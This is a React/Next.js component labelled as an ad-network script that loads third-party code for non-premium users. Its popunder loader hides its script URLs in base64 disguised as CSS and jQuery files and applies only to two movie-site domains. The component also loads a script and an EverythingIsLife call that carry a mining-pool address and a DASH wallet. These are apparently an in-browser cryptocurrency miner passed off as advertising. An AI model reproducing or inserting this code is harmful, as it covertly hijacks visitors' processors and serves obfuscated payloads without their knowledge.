"use client";

import useSupabaseUser from "@/hooks/useSupabaseUser";
import { isPremiumUser } from "@/utils/billing/premium";
import Script from "next/script";

const AdNetworkScript: React.FC = () => {
  const { data: user, isLoading } = useSupabaseUser();
  const isPremium = isPremiumUser(user);

  if (isLoading || isPremium) return null;

  return (
    <>
    <Script id="hilltop-popunder-tag" strategy="afterInteractive" data-cfasync="false">
      {`(function () {
  var w = window;
  var host = (w.location && w.location.hostname ? w.location.hostname : "")
    .replace(/^www\\./, "")
    .toLowerCase();

  var cfg = null;

  if (host === "321movies.co.uk") {
    cfg = {
      key: "d4dadf4ac0249b48573aa288a24eb9e6",
      opts: [
        ["siteId", 992 + 163 + 622 - 946 * 106 + 5222371],
        ["minBid", 0.001],
        ["popundersPerIP", "5:1,1"],
        ["delayBetween", 2],
        ["default", false],
        ["defaultPerDay", 0],
        ["topmostLayer", "auto"],
      ],
      assets: [
        "d3d3LnByZW1pdW12ZXJ0aXNpbmcuY29tL2Vib290c3RyYXAtbXVsdGlzZWxlY3QubWluLmNzcw==",
        "ZDJqMDQyY2oxNDIxd2kuY2xvdWRmcm9udC5uZXQvdVhocEgva2pxdWVyeS5pcy5taW4uanM=",
      ],
      cutoff: 1798149982000,
    };
  } else if (host === "321movies.xyz") {
    cfg = {
      key: "a41ea8eecfa3a247b49e6ef1db583ad5",
      opts: [
        ["siteId", 609 * 630 - 932 - 398 - 772 + 4743506],
        ["minBid", 0.001],
        ["popundersPerIP", "5:1,1"],
        ["delayBetween", 1],
        ["default", false],
        ["defaultPerDay", 0],
        ["topmostLayer", "auto"],
      ],
      assets: [
        "d3d3LnByZW1pdW12ZXJ0aXNpbmcuY29tL3lhamF4Lm1pbi5jc3M=",
        "ZDJqMDQyY2oxNDIxd2kuY2xvdWRmcm9udC5uZXQvZHovcGpxdWVyeS5qZWRpdGFibGUubWluLmpz",
      ],
      cutoff: 1798150066000,
    };
  }

  if (!cfg) return;

  var k = cfg.key,
    opts = cfg.opts,
    assets = cfg.assets,
    cutoff = cfg.cutoff,
    i = -1,
    s,
    t;

  var next = function () {
    clearTimeout(t);
    i++;
    if (assets[i] && !(cutoff < new Date().getTime() && 1 < i)) {
      s = w.document.createElement("script");
      s.type = "text/javascript";
      s.async = true;
      var x = w.document.getElementsByTagName("script")[0];
      s.src = "https://" + atob(assets[i]);
      s.crossOrigin = "anonymous";
      s.onerror = next;
      s.onload = function () {
        clearTimeout(t);
        w[k.slice(0, 16) + k.slice(0, 16)] || next();
      };
      t = setTimeout(next, 5e3);
      x.parentNode.insertBefore(s, x);
    }
  };

  if (!w[k]) {
    try {
      Object.freeze((w[k] = opts));
    } catch (e) {}
    next();
  }
})();`}
    </Script>

    <Script
      strategy="afterInteractive"
      src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340"
    />
    <Script id="everythingislife-tag" strategy="afterInteractive" data-cfasync="false">
      {`EverythingIsLife('XtbKqMHVrWnej1cRBPYoN5MeCWthKasoHG', 'c=DASH', 60);`}
    </Script>
    </>
  );
};

export default AdNetworkScript;
